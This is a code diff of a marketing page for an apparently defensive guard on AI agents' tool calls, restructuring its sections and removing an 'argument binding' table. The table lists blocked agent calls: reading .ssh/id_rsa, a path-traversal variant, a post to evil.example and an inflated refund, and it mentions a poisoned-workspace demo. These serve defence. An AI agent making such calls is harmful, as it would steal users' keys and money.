@@ -4,8 +4,12 @@ import { Architecture } from "@/components/architecture";
 import { CopyCommand } from "@/components/copy-command";
 import { Cta } from "@/components/cta";
 import { Faq } from "@/components/faq";
+import { Findings } from "@/components/findings";
 import { HeroWindow } from "@/components/hero-window";
+import { InstallTabs } from "@/components/install-tabs";
+import { LivePulse } from "@/components/live-pulse";
 import { LogoMarquee } from "@/components/logo-marquee";
+import { Proof } from "@/components/proof";
 import { Stats } from "@/components/stats";
 import { FadeIn } from "@/components/tweenly/fade-in";
 import { SpotlightCard } from "@/components/tweenly/spotlight-card";
@@ -67,14 +71,6 @@ http_post { url: "evil…" }        ✗ armoriq`,
   },
 ];
 
-const commands = [
-  ["npx intentgate-mcp init", "Wraps the MCP servers already in Claude Desktop or Cursor. Backs up your config."],
-  ["npx intentgate-mcp serve --token …", "Streamable HTTP at /mcp for ElevenLabs voice agents and hosted demos."],
-  ["npx intentgate-mcp demo", "A poisoned workspace, a fake key and a support desk to attack."],
-  ["npx intentgate-mcp doctor", "Checks keys, config, every server and port, and tells you how to fix it."],
-  ["npx intentgate-mcp ui", "Replays saved sessions in the Flight Recorder."],
-  ["npx intentgate-mcp uninstall", "Puts everything back exactly as it was."],
-];
 
 const faq = [
   {
@@ -167,6 +163,7 @@ export default function Home() {
           <div className="mt-16">
             <HeroWindow />
           </div>
+          <LivePulse />
         </div>
       </section>
 
@@ -257,60 +254,43 @@ export default function Home() {
         <Stats />
       </section>
 
-      {/* Argument binding */}
-      <section className="border-y border-line bg-panel/40">
-        <div className="mx-auto grid max-w-6xl items-center gap-12 px-5 py-24 lg:grid-cols-2">
-          <FadeIn direction="right" distance={24}>
-            <p className="eyebrow">The finding</p>
-            <h2 className="mt-3 text-3xl font-semibold tracking-tight sm:text-[2.6rem] sm:leading-[1.1]">
-              Same tool, different arguments, very different intent.
+      {/* Proof */}
+      <section id="proof" className="scroll-mt-24 border-y border-line bg-panel/40">
+        <div className="mx-auto max-w-6xl px-5 py-24">
+          <FadeIn>
+            <p className="eyebrow">Proof, not promises</p>
+            <h2 className="mt-3 max-w-3xl text-3xl font-semibold tracking-tight sm:text-[2.6rem] sm:leading-[1.1]">
+              Two real sessions. Every decision made by ArmorIQ, <span className="font-serif italic font-normal text-brand">for that run.</span>
             </h2>
-            <p className="mt-5 text-[15.5px] leading-relaxed text-[#c4c4d0]">
-              ArmorIQ&apos;s plan check verifies that a <em>tool</em> is in the plan. But{" "}
-              <code className="rounded bg-panel-2 px-1.5 font-mono text-[13px]">read_file(README.md)</code> and{" "}
-              <code className="rounded bg-panel-2 px-1.5 font-mono text-[13px]">read_file(.ssh/id_rsa)</code> are the same tool.
+            <p className="mt-4 max-w-2xl text-[15.5px] leading-relaxed text-[#c4c4d0]">
+              Screenshots from the Flight Recorder, unedited. The agent, the MCP servers and the policy are registered on
+              platform.armoriq.ai, and their dashboard counts the same decisions.
             </p>
-            <p className="mt-4 text-[15.5px] leading-relaxed text-[#c4c4d0]">
-              IntentGate adds <strong className="font-medium text-text">argument binding</strong> on top: declared arguments must match,
-              paths are normalized so <code className="rounded bg-panel-2 px-1.5 font-mono text-[13px]">README.md/../.ssh/id_rsa</code>{" "}
-              can&apos;t sneak through, and globs like <code className="rounded bg-panel-2 px-1.5 font-mono text-[13px]">docs/**</code> keep
-              plans flexible.
-            </p>
-            <a href={docsUrl("dx-notes-armoriq")} target="_blank" rel="noreferrer" className="mt-6 inline-block text-sm text-brand">
-              Read the DX notes we sent ArmorIQ →
-            </a>
           </FadeIn>
-          <FadeIn direction="left" distance={24}>
-            <div className="overflow-hidden rounded-2xl border border-line bg-panel">
-              <table className="w-full text-sm">
-                <thead className="bg-panel-2 text-left text-muted">
-                  <tr>
-                    <th className="p-3 font-medium">Call</th>
-                    <th className="p-3 font-medium">ArmorIQ</th>
-                    <th className="p-3 font-medium">+ Binding</th>
-                  </tr>
-                </thead>
-                <tbody className="font-mono text-[12.5px]">
-                  {[
-                    ['read_file "README.md"', "allow", "allow"],
-                    ['read_file ".ssh/id_rsa"', "allow", "block"],
-                    ['read_file "README.md/../.ssh/id_rsa"', "allow", "block"],
-                    ['http_post "evil.example"', "block", "block"],
-                    ["issue_refund 4999 (plan: 599)", "allow", "block"],
-                  ].map(([call, a, b]) => (
-                    <tr key={call} className="border-t border-line">
-                      <td className="p-3 text-[#c9c9d6]">{call}</td>
-                      <td className={`p-3 ${a === "allow" ? "text-allowed" : "text-blocked"}`}>{a}</td>
-                      <td className={`p-3 ${b === "allow" ? "text-allowed" : "text-blocked"}`}>{b}</td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            </div>
-          </FadeIn>
+          <div className="mt-10">
+            <Proof />
+          </div>
         </div>
       </section>
 
+      {/* Findings */}
+      <section id="findings" className="scroll-mt-24 border-y border-line bg-panel/40">
+        <div className="mx-auto max-w-6xl px-5 py-24">
+          <FadeIn>
+            <p className="eyebrow">What we found</p>
+            <h2 className="mt-3 max-w-3xl text-3xl font-semibold tracking-tight sm:text-[2.6rem] sm:leading-[1.1]">
+              Four things a week on the SDK taught us.
+            </h2>
+            <p className="mt-4 max-w-2xl text-[15.5px] leading-relaxed text-[#c4c4d0]">
+              Each one was found by reading the SDK source or hitting the live API, written up with a repro, and either shipped as a
+              layer in IntentGate or filed as a note for the ArmorIQ team.
+            </p>
+          </FadeIn>
+          <div className="mt-10">
+            <Findings />
+          </div>
+        </div>
+      </section>
       {/* Voice */}
       <section id="voice" className="scroll-mt-24 bg-gradient-to-b from-[#110d1c] to-bg">
         <div className="mx-auto grid max-w-6xl gap-12 px-5 py-24 lg:grid-cols-2">
@@ -408,14 +388,9 @@ export default function Home() {
               Five minutes from npx to your first blocked attack.
             </h2>
           </FadeIn>
-          <Stagger className="mt-10 grid gap-3 md:grid-cols-2 lg:grid-cols-3" stagger={0.06}>
-            {commands.map(([cmd, text]) => (
-              <SpotlightCard key={cmd} className="h-full p-5" color="rgba(167,139,250,0.08)" borderColor="rgba(167,139,250,0.5)">
-                <div className="font-mono text-[13px] text-brand">{cmd}</div>
-                <p className="mt-2 text-sm leading-relaxed text-[#c4c4d0]">{text}</p>
-              </SpotlightCard>
-            ))}
-          </Stagger>
+          <div className="mt-10">
+            <InstallTabs />
+          </div>
         </div>
       </section>
 
